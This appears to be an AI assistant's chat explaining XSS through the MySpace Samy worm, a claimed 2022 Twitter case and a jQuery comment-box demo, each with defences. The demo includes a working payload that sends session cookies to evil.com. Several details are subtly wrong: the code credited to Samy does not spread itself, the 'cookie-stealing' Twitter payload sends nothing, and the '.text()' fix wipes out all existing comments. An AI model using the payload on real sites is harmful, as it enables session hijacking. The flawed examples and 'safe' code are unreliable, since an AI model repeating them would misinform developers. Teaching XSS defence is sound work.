# A real world example of XSS

A real-world example of **Cross-Site Scripting (XSS)** occurred with **MySpace’s "Samy Worm" (2005)**, one of the most famous XSS attacks.

### **What Happened?**

A hacker named **Samy Kamkar** exploited a stored XSS vulnerability in MySpace. He crafted a **malicious JavaScript snippet** that automatically added him as a friend and spread itself to other profiles.

### **How the Attack Worked**

1.  **XSS Injection**:

    - MySpace allowed users to insert HTML into their profiles but didn’t properly sanitize JavaScript.

Samy added the following JavaScript to his profile’s "About Me" section:  
\<script\>

var xhr = new XMLHttpRequest();

xhr.open("GET", "http://www.myspace.com/addfriend?friendID=Samy", true);

xhr.send();

document.body.innerHTML += "Samy is your hero!";

\</script\>

- 

- This script automatically sent a friend request when someone viewed his profile.

2.  **Self-Propagation (Worm Behavior)**:

    - The script **copied itself** onto other users’ profiles.

    - Whenever someone visited an infected profile, the script executed and infected them too.

3.  **Massive Spread**:

    - In **less than 24 hours**, over **1 million MySpace users** had Samy as a friend.

    - MySpace was forced to shut down temporarily to remove the worm.

### **Lessons Learned**

✅ **Escape and sanitize user input** before displaying it in the DOM.  
✅ **Use Content Security Policy (CSP)** to block inline scripts.  
✅ **Never trust user input**, especially in fields like comments, profiles, or messages.

### **How to Prevent This in jQuery**

If you're inserting user input into the DOM, avoid using .html() like this:

\$("#profile").html(userInput); // ❌ Vulnerable to XSS

Instead, **sanitize the input** or use .text():

\$("#profile").text(userInput); // ✅ Safe

Would you like a modern example of XSS in today's applications?

# Modern example of XSS

### **Modern XSS Example: Twitter (2022) - Stored XSS via Embedded Video**

#### **What Happened?**

A security researcher discovered a **Stored XSS vulnerability on Twitter** where **malicious JavaScript could be embedded inside tweets** via the video posting feature.

#### **How the Attack Worked**

1.  **Embedding Malicious Code in a Video Description  **

    - Twitter allowed users to post videos with a **description field**.

    - This field was supposed to only accept text, but **it didn’t properly sanitize input**.

    - The attacker **injected JavaScript code** inside the video description.

2.  **Stored XSS Execution  **

    - When another user viewed the video **on Twitter’s website**, the malicious script **executed in their browser**.

Example of a **malicious payload**:  
\<script\>

alert("XSS on Twitter!");

document.cookie = "stealSession=" + document.cookie;

\</script\>

- 

- This script could **steal login cookies**, **send tweets on behalf of users**, or **redirect them to phishing sites**.

3.  **Impact  **

    - Users who viewed an infected tweet **became victims**.

    - Attackers could take over accounts and spread the exploit further.

4.  **Twitter’s Response  **

    - The vulnerability was reported via their **Bug Bounty Program** and quickly patched.

    - Twitter implemented **better input validation** and **content security policies (CSP)**.

### **How to Prevent This in Your jQuery Code**

**Avoid using .html(userInput) to insert user input into the DOM:**

\$("#tweet").html(userInput); // ❌ Vulnerable to XSS

**Instead, use .text() or sanitize input before insertion:**

\$("#tweet").text(userInput); // ✅ Safe

Or, if you must insert HTML:

Use **DOMPurify** to sanitize it:  
\$("#tweet").html(DOMPurify.sanitize(userInput)); // ✅ Safe with sanitization

- 

### **Other Modern XSS Prevention Techniques**

✅ **Enable Content Security Policy (CSP)**:

Content-Security-Policy: default-src 'self'; script-src 'self'

✅ **Use HTTP-only cookies** to prevent session theft:

Set-Cookie: session=abc123; HttpOnly; Secure

Would you like to see a **real attack demo** or a **code example** of how an attacker might exploit XSS?

# Real attack demo or code example

### **XSS Attack Demo - Injecting Malicious Code into a Web Page**

I'll show a **real-world XSS attack example** using **jQuery** to demonstrate how an attacker could steal user data.

## **Scenario: A Comment System Vulnerability**

Imagine a website with a **comment section** that allows users to post messages. The site displays comments using .html(), making it vulnerable to XSS.

### **1. Vulnerable Code Example (XSS Attack)**

The website receives user comments and inserts them into the page **without sanitization**:

\<!DOCTYPE html\>

\<html lang="en"\>

\<head\>

\<meta charset="UTF-8"\>

\<meta name="viewport" content="width=device-width, initial-scale=1.0"\>

\<title\>XSS Demo\</title\>

\<script src="https://code.jquery.com/jquery-3.6.0.min.js"\>\</script\>

\</head\>

\<body\>

\<h2\>Leave a Comment\</h2\>

\<input type="text" id="comment" placeholder="Type your comment"\>

\<button id="post"\>Post\</button\>

\<div id="comments"\>\</div\>

\<script\>

\$("#post").click(function() {

let comment = \$("#comment").val();

\$("#comments").append("\<p\>" + comment + "\</p\>"); // ❌ Vulnerable

});

\</script\>

\</body\>

\</html\>

#### **What’s Wrong?**

- It directly inserts user input (comment) into the DOM with .append("\<p\>" + comment + "\</p\>"), allowing JavaScript execution.

### **2. How an Attacker Exploits This (XSS Payload)**

An attacker posts this comment:

\<script\>

alert("XSS Attack! Your session is stolen!");

document.write('\<img src="http://evil.com/steal.php?cookie=' + document.cookie + '"\>');

\</script\>

#### **What Happens?**

- The script runs **immediately** when someone views the comment.

- The document.cookie is sent to the hacker's server, stealing session cookies.

- The attacker can use the cookie to **hijack the victim's session**.

### **3. How to Prevent XSS**

✅ **Sanitize Input (Safer Code)** Use .text() instead of .html() to prevent JavaScript execution:

\$("#comments").append("\<p\>\</p\>").text(comment); // ✅ Safe

✅ **Use a Library like DOMPurify**

\$("#comments").append("\<p\>" + DOMPurify.sanitize(comment) + "\</p\>");

✅ **Enable Content Security Policy (CSP)**

Content-Security-Policy: default-src 'self'; script-src 'self'

### **Want a Live Demo?**

You can **copy and paste** the vulnerable code into a local HTML file, run it, and then try entering this input:

\<script\>alert('XSS Attack!')\</script\>

If an alert box appears, the site is **vulnerable to XSS**! 🚨

Would you like help implementing a **secure comment system** using jQuery? 🚀
